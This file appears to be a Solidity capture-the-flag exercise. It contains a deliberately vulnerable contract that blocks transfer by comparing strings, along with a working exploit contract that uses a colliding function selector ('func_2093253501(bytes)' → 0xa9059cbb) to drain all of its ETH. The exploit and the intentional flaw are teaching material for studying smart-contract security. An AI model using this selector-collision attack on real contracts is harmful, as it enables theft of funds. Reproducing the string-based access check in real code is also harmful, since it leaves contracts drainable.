/*

Drain all ETH from FunctionSelectorClash contract below.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract FunctionSelectorClash {
    constructor() payable {}

    function execute(string calldata _func, bytes calldata _data) external {
        require(
            !equal(_func, "transfer(address,uint256)"),
            "call to transfer not allowed"
        );

        bytes4 sig = bytes4(keccak256(bytes(_func)));

        (bool ok, ) = address(this).call(abi.encodePacked(sig, _data));
        require(ok, "tx failed");
    }

    function transfer(address payable _to, uint _amount) external {
        require(msg.sender == address(this), "not authorized");
        _to.transfer(_amount);
    }

    function equal(
        string memory a,
        string memory b
    ) private pure returns (bool) {
        return keccak256(abi.encode(a)) == keccak256(abi.encode(b));
    }
}


Task: 
    - Drain all ETH from FunctionSelectorClash contract.

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;


contract FunctionSelectorClash {
    constructor() payable {}

    function execute(string calldata _func, bytes calldata _data) external {
        require(
            !equal(_func, "transfer(address,uint256)"),
            "call to transfer not allowed"
        );

        bytes4 sig = bytes4(keccak256(bytes(_func)));

        (bool ok, ) = address(this).call(abi.encodePacked(sig, _data));
        require(ok, "tx failed");
    }

    function transfer(address payable _to, uint _amount) external {
        require(msg.sender == address(this), "not authorized");
        _to.transfer(_amount);
    }

    function equal(
        string memory a,
        string memory b
    ) private pure returns (bool) {
        return keccak256(abi.encode(a)) == keccak256(abi.encode(b));
    }
}

contract FunctionSelectorClashExploit {
    address public immutable target;

    constructor(address _target) {
        target = _target;
    }

    // Receive ETH from target
    receive() external payable {}

    function pwn() external {
        // call target.execute, passing "func_2093253501(bytes)" for the first input.
        // Both "transfer(address,uint256)" and "func_2093253501(bytes)" have the same function selector 0xa9059cbb
        (bool ok, ) = target.call(
            abi.encodeWithSignature(
                "execute(string,bytes)",
                "func_2093253501(bytes)",
                abi.encode(msg.sender, target.balance)
            )
        );
        require(ok, "tx failed");
    }
}
